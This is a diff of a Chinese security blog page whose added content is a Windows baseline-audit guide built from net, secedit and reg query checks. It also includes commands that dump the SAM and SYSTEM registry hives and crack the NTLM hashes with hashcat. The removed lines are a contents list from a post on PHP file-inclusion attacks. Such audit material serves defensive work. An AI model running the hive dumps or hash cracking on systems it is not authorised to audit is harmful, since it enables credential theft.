+<h1 id="检测脚本编写"><a href="#检测脚本编写" class="headerlink" title="检测脚本编写"></a>检测脚本编写</h1><h2 id="检测用户相关"><a href="#检测用户相关" class="headerlink" title="检测用户相关"></a>检测用户相关</h2><pre><code>net user        //查看系统用户
+net user college        //查看具体用户信息
+net localgroup        //查看用户组
+net localgroup Administrators        //查看Administrators用户组
+net localgroup Guests        //查看Guests用户组
+</code></pre><h2 id="本地策略"><a href="#本地策略" class="headerlink" title="本地策略"></a>本地策略</h2><pre><code>secedit /export /cfg C:\temp.txt 
+</code></pre><p>导出本地安全策略到<code>c:\temp.txt</code>中 </p>
+<p>密码复杂度、更改密码周期(0表示禁用，1表示启用)</p>
+<pre><code>PasswordComplexity        //密码必须符合复杂性要求
+MinimumPasswordLength        //密码长度最小值
+MinimumPasswordAge        //密码最短使用期限
+MaximumPasswordAge        //密码最长使用期限
+PasswordHistorySize        //强制密码历史
+</code></pre><p>账户锁定策略(无结果表示未开启）</p>
+<pre><code>LockoutDuration        //账户锁定时间
+LockoutBadCount        //账户锁定阈值
+</code></pre><p>审核策略(0表示无审核，1表示成功审核，2表示失败审核，3表示成功和失败审核)</p>
+<pre><code>AuditAccountManage        //审核帐户管理
+AuditAccountLogon        //审核帐户登录事件
+AuditSystemEvents        //审核系统事件
+AuditDSAccess        //审核目录服务访问
+AuditProcessTracking        //审核过程跟踪
+AuditPrivilegeUse        //审核特权使用
+AuditObjectAccess        //审核对象访问
+AuditLogonEvents        //审核登录事件
+AuditPolicyChange        //审核策略更改
+</code></pre><p>安全选项（0表示已停用，1表示已启用）</p>
+<pre><code>AutoDisconnect        //在挂起会话之前所需的空闲时间
+DontDisplayLastUserName        //不显示上次登录的用户名
+ClearPageFileAtShutdown        //关机前清理虚拟内存页面
+ShutdownWithoutLogon        //允许在未登录前关机
+</code></pre><p>用户权利分配（Everyone:S-1-1-0 Administrators:S-1-5-32-544 Users:S-1-5-32-545 Power Users:S-1-5-32-547 Backup Operators:*S-1-5-32-551）</p>
+<pre><code>SeRemoteShutdownPrivilege        //从远程系统强制关机
+SeTakeOwnershipPrivilege        //取得文件或其他对象所有权
+SeInteractiveLogonRight        //从本地登录此计算机
+SeRemoteInteractiveLogonRight        //允许通过远程桌面服务登录
+SeDebugPrivilege        //调试程序
+SeSystemtimePrivilege        //更改系统时间
+SeSecurityPrivilege        //管理审核和安全日志
+</code></pre><p>最后删除C盘中的临时文件</p>
+<pre><code>del C:\temp.txt
+</code></pre><h2 id="注册表信息"><a href="#注册表信息" class="headerlink" title="注册表信息"></a>注册表信息</h2><p>是否开启屏保（0关，1开）</p>
+<pre><code>reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive |find &quot;ScreenSaveActive&quot;
+</code></pre><p>屏保时间（单位秒）</p>
+<pre><code>reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveTimeOut |find &quot;ScreenSaveTimeOut&quot;
+</code></pre><p>屏保恢复时使用密码保护（0否，1是）</p>
+<pre><code>reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaverIsSecure |find &quot;ScreenSaverIsSecure&quot;
+</code></pre><p>防火墙状态（1开，0关）</p>
+<pre><code>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v EnableFirewall |find &quot;EnableFirewall&quot;
+</code></pre><p>远程桌面(0开，1关)</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections |find &quot;fDenyTSConnections&quot;
+</code></pre><p>3389端口(d3d:3389)</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber |find &quot;PortNumber&quot;
+</code></pre><p>远程协助(0关（合规），1开</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Remote Assistance&quot; /v fAllowToGetHelp |find &quot;fAllowToGetHelp&quot;
+</code></pre><p>应用日志文件大小（0x2800000以上为合规）</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Application&quot; /v MaxSize |find &quot;MaxSize&quot;
+</code></pre><p>达到事件日志最大大小时（不存在或0均合规）</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Application&quot; /v Retention |find &quot;Retention&quot;
+</code></pre><p>安全日志文件大小（0x2800000以上为合规）</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Security&quot; /v MaxSize |find &quot;MaxSize&quot;
+</code></pre><p>达到事件日志最大大小时（不存在或0均合规）</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Security&quot; /v Retention |find &quot;Retention&quot;
+</code></pre><p>系统日志文件大小（0x2800000以上为合规）</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\System&quot; /v MaxSize |find &quot;MaxSize&quot;
+</code></pre><p>达到事件日志最大大小时（不存在或0均合规）</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\System&quot; /v Retention |find &quot;Retention&quot;
+</code></pre><p>分区共享（存在且为0，为合规）</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&quot; /v AutoShareServer |find &quot;AutoShareServer&quot;
+</code></pre><p>ADMIN共享（存在且为0，为合规）</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&quot; /v AutoShareWks |find &quot;AutoShareWks&quot;
+</code></pre><p>IPC共享（存在且为1，为合规）</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v restrictanonymous |find &quot;restrictanonymous&quot;
+</code></pre><p>共享列表</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\lanmanserver\shares&quot;
+</code></pre><p>软件列表</p>
+<pre><code>reg query HKLM\SOFTWARE
+</code></pre><h2 id="共享信息"><a href="#共享信息" class="headerlink" title="共享信息"></a>共享信息</h2><p>默认共享</p>
+<pre><code>net share
+</code></pre><h2 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h2><p>系统服务</p>
+<pre><code>net start
+</code></pre><p>系统进程</p>
+<pre><code>tasklist
+</code></pre><p>系统信息</p>
+<pre><code>systeminfo
+</code></pre><h2 id="口令检测"><a href="#口令检测" class="headerlink" title="口令检测"></a>口令检测</h2><p>导出SAM</p>
+<pre><code>reg save hklm\sam %IPaddress%.sam
+reg save hklm\system %IPaddress%.system
+</code></pre><h2 id="更新日志检测"><a href="#更新日志检测" class="headerlink" title="更新日志检测"></a>更新日志检测</h2><p>在更新日志中查看最后更新日期</p>
+<pre><code>C:\Windows\WindowsUpdate.log
+</code></pre><h2 id="分析脚本编写"><a href="#分析脚本编写" class="headerlink" title="分析脚本编写"></a>分析脚本编写</h2><h3 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h3><p>CMD5</p>
+<p><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></p>
+<p>Ophcrack</p>
+<p><a href="https://www.objectif-securite.ch/ophcrack.php" target="_blank" rel="noopener">https://www.objectif-securite.ch/ophcrack.php</a></p>
+<p>hashcat</p>
+<pre><code>hashcat64.exe -m 1000 -a 0 Winhash.txt pass.txt 
+hashcat64.exe -m 1000 -a 0 Winhash.txt pass.txt --show
+</code></pre><h1 id="反病毒测试"><a href="#反病毒测试" class="headerlink" title="反病毒测试"></a>反病毒测试</h1><p><a href="https://www.virustotal.com" target="_blank" rel="noopener">https://www.virustotal.com</a></p>
+<p><a href="http://r.virscan.org/" target="_blank" rel="noopener">http://r.virscan.org/</a></p>
+<p><a href="https://s.threatbook.cn/" target="_blank" rel="noopener">https://s.threatbook.cn/</a></p>
 
       
     </div>
@@ -723,8 +681,8 @@ http://127.0.0.1/1.php?file=phar://C:\phpStudy\PHPTutorial\WWW\test.zip
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/02/SQL的WAF绕过/" rel="next" title="SQL的WAF绕过">
-                <i class="fa fa-chevron-left"></i> SQL的WAF绕过
+              <a href="/2018/12/18/入门CTF/" rel="next" title="入门CTF">
+                <i class="fa fa-chevron-left"></i> 入门CTF
               </a>
             
           </div>
@@ -733,8 +691,8 @@ http://127.0.0.1/1.php?file=phar://C:\phpStudy\PHPTutorial\WWW\test.zip
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/12/02/内网渗透——端口转发工具/" rel="prev" title="内网渗透——端口转发工具">
-                内网渗透——端口转发工具 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/12/18/Linux系统配置安全/" rel="prev" title="Linux系统配置安全">
+                Linux系统配置安全 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -917,7 +875,7 @@ http://127.0.0.1/1.php?file=phar://C:\phpStudy\PHPTutorial\WWW\test.zip
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含有两种："><span class="nav-number">1.</span> <span class="nav-text">文件包含有两种：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞成因："><span class="nav-number">2.</span> <span class="nav-text">漏洞成因：</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#php的文件包含利用"><span class="nav-number"></span> <span class="nav-text">php的文件包含利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#读取敏感文件"><span class="nav-number">1.</span> <span class="nav-text">读取敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程包含shell"><span class="nav-number">2.</span> <span class="nav-text">远程包含shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图片上传并包含图片shell"><span class="nav-number">3.</span> <span class="nav-text">图片上传并包含图片shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH-log"><span class="nav-number">4.</span> <span class="nav-text">SSH log</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#包含日志文件GetShell"><span class="nav-number">5.</span> <span class="nav-text">包含日志文件GetShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#长度截断"><span class="nav-number">6.</span> <span class="nav-text">长度截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0字节截断包含"><span class="nav-number">7.</span> <span class="nav-text">0字节截断包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#伪协议"><span class="nav-number">8.</span> <span class="nav-text">伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#File"><span class="nav-number">8.1.</span> <span class="nav-text">File://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data"><span class="nav-number">8.2.</span> <span class="nav-text">data://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar"><span class="nav-number">8.3.</span> <span class="nav-text">phar://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zip-–-zlib-–bzip2-–zip"><span class="nav-number">8.4.</span> <span class="nav-text">zip:// – zlib:// –bzip2:// –zip://</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#另一种思路："><span class="nav-number">8.4.1.</span> <span class="nav-text">另一种思路：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-input"><span class="nav-number">8.5.</span> <span class="nav-text">PHP://input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-output"><span class="nav-number">8.6.</span> <span class="nav-text">php://output</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter"><span class="nav-number">8.7.</span> <span class="nav-text">php://filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#目录遍历"><span class="nav-number">8.8.</span> <span class="nav-text">目录遍历</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编码绕过"><span class="nav-number">8.9.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用协议"><span class="nav-number">8.10.</span> <span class="nav-text">利用协议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#变量覆盖"><span class="nav-number"></span> <span class="nav-text">变量覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含修复方案"><span class="nav-number"></span> <span class="nav-text">文件包含修复方案</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#操作系统安全基线"><span class="nav-number">1.</span> <span class="nav-text">操作系统安全基线</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#主要作用："><span class="nav-number">1.1.</span> <span class="nav-text">主要作用：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基线范围"><span class="nav-number">1.2.</span> <span class="nav-text">基线范围</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows系统配置安全"><span class="nav-number">2.</span> <span class="nav-text">Windows系统配置安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#账户管理"><span class="nav-number">2.1.</span> <span class="nav-text">账户管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#多用户系统"><span class="nav-number">2.1.1.</span> <span class="nav-text">多用户系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#定期检查用户，删除无用、过期的账户"><span class="nav-number">2.1.2.</span> <span class="nav-text">定期检查用户，删除无用、过期的账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#禁用Guest用户"><span class="nav-number">2.1.3.</span> <span class="nav-text">禁用Guest用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#更改默认管理员账户名称"><span class="nav-number">2.1.4.</span> <span class="nav-text">更改默认管理员账户名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不显示最后的用户名"><span class="nav-number">2.1.5.</span> <span class="nav-text">不显示最后的用户名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测方法"><span class="nav-number">2.1.6.</span> <span class="nav-text">检测方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#密码策略"><span class="nav-number">2.2.</span> <span class="nav-text">密码策略</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#密码复杂度"><span class="nav-number">2.2.1.</span> <span class="nav-text">密码复杂度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#更换密码周期"><span class="nav-number">2.2.2.</span> <span class="nav-text">更换密码周期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户锁定策略"><span class="nav-number">2.2.3.</span> <span class="nav-text">用户锁定策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测方法-1"><span class="nav-number">2.2.4.</span> <span class="nav-text">检测方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限管理"><span class="nav-number">2.3.</span> <span class="nav-text">权限管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#远程关机"><span class="nav-number">2.3.1.</span> <span class="nav-text">远程关机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本地关机"><span class="nav-number">2.3.2.</span> <span class="nav-text">本地关机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户权限指派"><span class="nav-number">2.3.3.</span> <span class="nav-text">用户权限指派</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#授权用户登录"><span class="nav-number">2.3.4.</span> <span class="nav-text">授权用户登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#授权账户从网络访问"><span class="nav-number">2.3.5.</span> <span class="nav-text">授权账户从网络访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#禁用未登录前关机"><span class="nav-number">2.3.6.</span> <span class="nav-text">禁用未登录前关机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测方法-2"><span class="nav-number">2.3.7.</span> <span class="nav-text">检测方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日志审计"><span class="nav-number">2.4.</span> <span class="nav-text">日志审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#设置日志文件大小"><span class="nav-number">2.4.1.</span> <span class="nav-text">设置日志文件大小</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测方法-3"><span class="nav-number">2.4.2.</span> <span class="nav-text">检测方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件权限"><span class="nav-number">2.5.</span> <span class="nav-text">文件权限</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#关闭默认共享"><span class="nav-number">2.5.1.</span> <span class="nav-text">关闭默认共享</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置共享文件夹权限"><span class="nav-number">2.5.2.</span> <span class="nav-text">设置共享文件夹权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测方法-4"><span class="nav-number">2.5.3.</span> <span class="nav-text">检测方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最小化安装"><span class="nav-number">2.6.</span> <span class="nav-text">最小化安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他设置"><span class="nav-number">2.7.</span> <span class="nav-text">其他设置</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#检测脚本编写"><span class="nav-number">3.</span> <span class="nav-text">检测脚本编写</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检测用户相关"><span class="nav-number">3.1.</span> <span class="nav-text">检测用户相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地策略"><span class="nav-number">3.2.</span> <span class="nav-text">本地策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注册表信息"><span class="nav-number">3.3.</span> <span class="nav-text">注册表信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#共享信息"><span class="nav-number">3.4.</span> <span class="nav-text">共享信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他信息"><span class="nav-number">3.5.</span> <span class="nav-text">其他信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#口令检测"><span class="nav-number">3.6.</span> <span class="nav-text">口令检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#更新日志检测"><span class="nav-number">3.7.</span> <span class="nav-text">更新日志检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析脚本编写"><span class="nav-number">3.8.</span> <span class="nav-text">分析脚本编写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows密码破解"><span class="nav-number">3.8.1.</span> <span class="nav-text">Windows密码破解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#反病毒测试"><span class="nav-number">4.</span> <span class="nav-text">反病毒测试</span></a></li></ol></div>
             
 
           </div>
